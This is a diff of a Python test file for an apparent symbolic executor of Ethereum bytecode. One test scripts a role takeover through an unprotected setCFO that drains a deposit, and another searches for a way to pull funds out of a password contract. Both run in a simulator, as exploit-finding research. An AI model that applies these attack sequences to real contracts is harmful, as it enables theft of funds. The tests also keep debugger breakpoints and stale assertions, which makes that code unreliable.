@@ -2,7 +2,8 @@ from speculative_machine_executor import SpeculativeMachineExecutor
 from speculative_machine import SpeculativeMachine 
 from z3 import BitVecVal
 from utils import bytes_to_int, int_to_bytes, parse_solidity_abi_input, func_sig, \
-    eth_to_wei, ready_hex, pad_bytes_to_address
+    eth_to_wei, ready_hex, pad_bytes_to_address, uint_to_bytes
+from speculative_machine_executor import calculate_results_for_machine
 
 
 # contract branchTest {
@@ -44,7 +45,7 @@ def test_identify_return_paths():
     for possible_end in possible_ends:
         if possible_end['type'] == 'return':
             return_count += 1
-            input_value = possible_end['input']
+            input_value = possible_end['results']['inputs'][0]['input_data']
             if input_value.hex() == 'a6c14f8d0000000000000000000000000000000000000000000000000000000000000005':
                 found_1_solution = True
             if input_value.hex() == 'a6c14f8d0000000000000000000000000000000000000000000000000000000000000000':
@@ -55,19 +56,27 @@ def test_identify_return_paths():
 
     assert return_count == 2
 
+
+def test_input():
+    machine = SpeculativeMachine()
+    machine.fix_input(uint_to_bytes(2**256-1), 8)
+    input_value = calculate_results_for_machine(machine, [])['inputs'][0]['input_data'].hex()
+    assert input_value == '0' * 16 + 'f' * 64 + '0' * 48
+
+
 def test_have_acceptance_criteria():
     program = bytes.fromhex(branchTest)
     machine = SpeculativeMachine()
     machine.program = program
 
     acceptance_criteria = [
-        machine.return_type == SpeculativeMachine.RETURN_TYPE_RETURN,
-        machine.return_value == BitVecVal(1, 256)
+        machine.last_return_type == SpeculativeMachine.RETURN_TYPE_RETURN,
+        machine.last_return_value == BitVecVal(1, 256)
     ]
 
     possible_ends = SpeculativeMachineExecutor(machine).possible_ends(acceptance_criteria=acceptance_criteria)
     assert len(possible_ends) == 1
-    assert possible_ends[0]['input'].hex() == branchTestInputRet1
+    assert possible_ends[0]['results']['inputs'][0]['input_data'].hex() == branchTestInputRet1
 
 symbolicReturn = "6080604052600436106039576000357c0100000000000000000000000000000000000000000000" + \
                  "00000000000090048063db89f05114603e575b600080fd5b348015604957600080fd5b50607d60" + \
@@ -90,15 +99,15 @@ def test_symbolic_return():
     machine.program = program
 
     acceptance_criteria = [
-        machine.return_type == SpeculativeMachine.RETURN_TYPE_RETURN,
-        machine.return_value == BitVecVal(5, 256)
+        machine.last_return_type == SpeculativeMachine.RETURN_TYPE_RETURN,
+        machine.last_return_value == BitVecVal(5, 256)
     ]
 
     possible_ends = SpeculativeMachineExecutor(machine).possible_ends(acceptance_criteria=acceptance_criteria)
 
     assert len(possible_ends) == 1
-    solidity_input = parse_solidity_abi_input(possible_ends[0]['input'])
-
+    solidity_input = parse_solidity_abi_input(possible_ends[0]['results']['inputs'][0]['input_data'])
+    print(solidity_input)
     assert bytes_to_int(solidity_input['args'][0]) + bytes_to_int(solidity_input['args'][1]) == 5
 
 # Fix the first arg to 3, should set the second arg to 2
@@ -117,7 +126,7 @@ def test_symbolic_return_fix_arg():
     possible_ends = SpeculativeMachineExecutor(machine).possible_ends(acceptance_criteria=acceptance_criteria)
 
     assert len(possible_ends) == 1
-    solidity_input = [parse_solidity_abi_input(val) for val in possible_ends[0]['inputs']][0]
+    solidity_input = parse_solidity_abi_input(possible_ends[0]['results']['inputs'][0]['input_data'])
 
     assert bytes_to_int(solidity_input['args'][0]) == 3
     assert bytes_to_int(solidity_input['args'][1]) == 2
@@ -145,47 +154,128 @@ addGet = "6080604052600436106043576000357c01000000000000000000000000000000000000
 
 def test_multifunction_calls():
     program = bytes.fromhex(addGet)
-    machine = SpeculativeMachine(max_invocations=3)
+    machine = SpeculativeMachine(max_invocations=2)
     machine.program = program
 
     acceptance_criteria = [
-        machine.return_type == SpeculativeMachine.RETURN_TYPE_RETURN,
-        machine.return_value == BitVecVal(5, 256),
+        machine.last_return_type == SpeculativeMachine.RETURN_TYPE_RETURN,
+        machine.last_return_value == BitVecVal(5, 256),
     ]
 
     possible_ends = SpeculativeMachineExecutor(machine).possible_ends(acceptance_criteria=acceptance_criteria)
+    
+    solidity_input = parse_solidity_abi_input(possible_ends[0]['results']['inputs'][0]['input_data'])
 
-    solidity_input = parse_solidity_abi_input(possible_ends[0]['input'])
+    assert bytes_to_int(solidity_input['args'][0]) + bytes_to_int(solidity_input['args'][1]) == 5
+    assert possible_ends[0]['methods'] == ['add(int256,int256)', 'get()']
 
-    assert bytes_to_int(solidity_input['args'][0]) == 3
-    assert bytes_to_int(solidity_input['args'][1]) == 2
+set_add = """
+6080604052348015600f57600080fd5b5060043610604f576000357c0100000000
+00000000000000000000000000000000000000000000000090048063846719e014
+6054578063e5c19b2d146093575b600080fd5b607d600480360360208110156068
+57600080fd5b810190808035906020019092919050505060be565b604051808281
+5260200191505060405180910390f35b60bc6004803603602081101560a7576000
+80fd5b810190808035906020019092919050505060cc565b005b60008160005401
+9050919050565b806000819055505056fea165627a7a723058205566f68bff9591
+ef5f4cc9b1103d0675626cb0cfc616b15088aa7615e7557c550029
+"""
+# contract set_add{
+#     int x;
+#     function set(int a) public{
+#         x = a;
+#     }
+
+#     function get(int b) public returns (int) {
+#         return x + b;
+#     }
+# }
+
+def test_setting_up_before():
+    program = ready_hex(set_add)
+    machine = SpeculativeMachine(logging=False)
+    machine.program = program
+
+    acceptance_criteria = [
+        machine.last_return_type == SpeculativeMachine.RETURN_TYPE_RETURN,
+        machine.last_return_value == BitVecVal(5, 256),
+    ]
+
+    return_value = machine.execute_deterministic_function(func_sig('set(int256)'),
+                                                          args=[int_to_bytes(2)])
+
+    possible_ends = SpeculativeMachineExecutor(machine).possible_ends(acceptance_criteria=acceptance_criteria)
+
+    solidity_input = parse_solidity_abi_input(possible_ends[0]['results']['inputs'][0]['input_data'])
+
+    assert solidity_input['func'].hex() == '846719e0'
+    assert solidity_input['args'][0].hex() == '0000000000000000000000000000000000000000000000000000000000000003'
+
+
+passwordWithdraw = """
+608060405234801561001057600080fd5b50610110806100206000396000f3fe60
+80604052600436106039576000357c010000000000000000000000000000000000
+0000000000000000000000900480637e62eab814603b575b005b34801560465760
+0080fd5b50607060048036036020811015605b57600080fd5b8101908080359060
+2001909291905050506072565b005b600581141560e1573373ffffffffffffffff
+ffffffffffffffffffffffff1661c3506040518060000190506000604051808303
+8185875af1925050503d806000811460d8576040519150601f19603f3d01168201
+6040523d82523d6000602084013e60dd565b606091505b5050505b5056fea16562
+7a7a7230582058c1ef81d9b28ab7d579c27b0cedcc5de2ac7129808b044fc3b054
+d8de41d5fb0029"""
+
+def test_can_get_money_out():
+    program = ready_hex(passwordWithdraw)
+    machine = SpeculativeMachine(logging=False)
+    machine.deploy(program)
+
+    acceptance_criteria = [
+        machine.attacker_wallet > 0#bytes(32)
+    ]
+
+    # Deposit the money we are going to steal.
+    machine.logging=True
+    machine.execute_deterministic_function(bytes(), args=[],
+                                           call_value=int_to_bytes(50000000))
+    machine.logging=False
+    import pdb; pdb.set_trace()
+    possible_ends = SpeculativeMachineExecutor(machine).possible_ends(acceptance_criteria=acceptance_criteria)
+ 
+    assert len(possible_ends) > 0
+    assert bytes_to_int(possible_ends[0]['results']['wallets'][machine.sender_address]) == 50000
+
 
 bankCFOVuln = """
-60806040526004361061005c576000357c01000000000000000000000000000000
-00000000000000000000000000900480632e1a7d4d146100615780633fb2a74e14
-61009c5780634e0a3379146100f7578063d0e30db014610148575b600080fd5b34
-801561006d57600080fd5b5061009a6004803603602081101561008457600080fd
-5b8101908080359060200190929190505050610152565b005b3480156100a85760
-0080fd5b506100f5600480360360408110156100bf57600080fd5b810190808035
-73ffffffffffffffffffffffffffffffffffffffff169060200190929190803590
-6020019092919050505061015f565b005b34801561010357600080fd5b50610146
-6004803603602081101561011a57600080fd5b81019080803573ffffffffffffff
-ffffffffffffffffffffffffff1690602001909291905050506101c8565b005b61
-015061020b565b005b61015c338261025a565b50565b6000809054906101000a90
-0473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffff
-ffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffff
-ff161415156101ba57600080fd5b6101c4828261025a565b5050565b8060008061
-01000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373
-ffffffffffffffffffffffffffffffffffffffff16021790555050565b34600160
-003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffff
-ffffffffffffffffffffffff168152602001908152602001600020600082825401
-92505081905550565b80600160008473ffffffffffffffffffffffffffffffffff
-ffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081
-5260200160002054101515156102a857600080fd5b80600160008473ffffffffff
-ffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffff
-ffffffff1681526020019081526020016000206000828254039250508190555050
-5056fea165627a7a72305820fcc282adabefe613fb245b586753c743f39428a868
-8fdb536cc5a6b99cd045040029
+60806040526004361061005c576000357c0100000000000000000000000
+000000000000000000000000000000000900480632e1a7d4d1461006157
+80633fb2a74e1461009c5780634e0a3379146100f7578063d0e30db0146
+10148575b600080fd5b34801561006d57600080fd5b5061009a60048036
+03602081101561008457600080fd5b81019080803590602001909291905
+05050610152565b005b3480156100a857600080fd5b506100f560048036
+0360408110156100bf57600080fd5b81019080803573fffffffffffffff
+fffffffffffffffffffffffff1690602001909291908035906020019092
+919050505061015f565b005b34801561010357600080fd5b50610146600
+4803603602081101561011a57600080fd5b81019080803573ffffffffff
+ffffffffffffffffffffffffffffff1690602001909291905050506101c
+8565b005b61015061020b565b005b61015c338261025a565b50565b6000
+809054906101000a900473fffffffffffffffffffffffffffffffffffff
+fff1673ffffffffffffffffffffffffffffffffffffffff163373ffffff
+ffffffffffffffffffffffffffffffffff161415156101ba57600080fd5
+b6101c4828261025a565b5050565b806000806101000a81548173ffffff
+ffffffffffffffffffffffffffffffffff021916908373fffffffffffff
+fffffffffffffffffffffffffff16021790555050565b34600160003373
+ffffffffffffffffffffffffffffffffffffffff1673fffffffffffffff
+fffffffffffffffffffffffff1681526020019081526020016000206000
+8282540192505081905550565b80600160008473fffffffffffffffffff
+fffffffffffffffffffff1673ffffffffffffffffffffffffffffffffff
+ffffff16815260200190815260200160002054101515156102a85760008
+0fd5b80600160008473ffffffffffffffffffffffffffffffffffffffff
+1673ffffffffffffffffffffffffffffffffffffffff168152602001908
+152602001600020600082825403925050819055503373ffffffffffffff
+ffffffffffffffffffffffffff168160405180600001905060006040518
+083038185875af1925050503d8060008114610353576040519150601f19
+603f3d011682016040523d82523d6000602084013e610358565b6060915
+05b505050505056fea165627a7a723058207f3a8cdec7be9086d2af51b9
+30cc2155e17027e4802c324dc4bf18f40e506e010029
 """
 
 # pragma solidity ^0.5.1;
@@ -219,31 +309,69 @@ ffffffff1681526020019081526020016000206000828254039250508190555050
 # }
 
 
+
+def test_attack_actually_exists():
+    program = ready_hex(bankCFOVuln)
+    machine = SpeculativeMachine(max_invocations=1, logging=True)
+
+    machine.program = program
+    cfo = pad_bytes_to_address(b'XCF0X')
+
+    machine.execute_deterministic_function(func_sig('setCFO(address)'),
+                                           args=[cfo],
+                                           call_value=int_to_bytes(0),
+                                           sender=cfo)
+    machine.execute_deterministic_function(func_sig('deposit()'),
+                                           args=[],
+                                           call_value=int_to_bytes(eth_to_wei(5)),
+                                           sender=cfo)
+
+    # Actual attack. Take control of CFO positon, then pillage the wallet.
+    print("Launching attack")
+    machine.execute_deterministic_function(func_sig('setCFO(address)'),
+                                           args=[machine.sender_address],
+                                           call_value=int_to_bytes(0),
+                                           sender=machine.sender_address)
+    print("Took CFO, now withdrawing")
+    machine.execute_deterministic_function(func_sig('cfoWithdraw(address,uint256)'),
+                                           args=[cfo, int_to_bytes(eth_to_wei(5))],
+                                           call_value=int_to_bytes(0),
+                                           sender=machine.sender_address)
+
+    assert bytes_to_int(machine.wallet_amounts[machine.sender_address]) == eth_to_wei(5)
+
+
 def test_wallet_transfers():
     program = ready_hex(bankCFOVuln)
-    machine = SpeculativeMachine(max_invocations=3, logging=False)
+    machine = SpeculativeMachine(max_invocations=1, logging=False)
 
     machine.program = program
     cfo = pad_bytes_to_address(b'XCF0X')
     print("CFO:", cfo.hex())
     machine.execute_deterministic_function(func_sig('setCFO(address)'),
                                            args=[cfo],
-                                           call_value=0,
+                                           call_value=int_to_bytes(0),
                                            sender=cfo)
     machine.execute_deterministic_function(func_sig('deposit()'),
                                            args=[],
-                                           call_value=eth_to_wei(5),
+                                           call_value=int_to_bytes(eth_to_wei(5)),
                                            sender=cfo)
 
+    machine.execute_deterministic_function(func_sig('setCFO(address)'),
+                                           args=[machine.sender_address],
+                                           call_value=int_to_bytes(0),
+                                           sender=machine.sender_address)
+
     acceptance_criteria = [
-        #machine.attacker_wallet > 0
+        machine.attacker_wallet > 0
     ]
-    machine.logging = True
+
+    machine.logging = False
     print("START")
     machine.pc = 0
     possible_ends = SpeculativeMachineExecutor(machine).possible_ends(acceptance_criteria=acceptance_criteria)
     import pdb; pdb.set_trace()
-    solidity_input = parse_solidity_abi_input(possible_ends[0]['input'])
+    solidity_input = parse_solidity_abi_input(possible_ends[0]['inputs'])
 
     assert bytes_to_int(solidity_input['args'][0]) == 3
     assert bytes_to_int(solidity_input['args'][1]) == 2
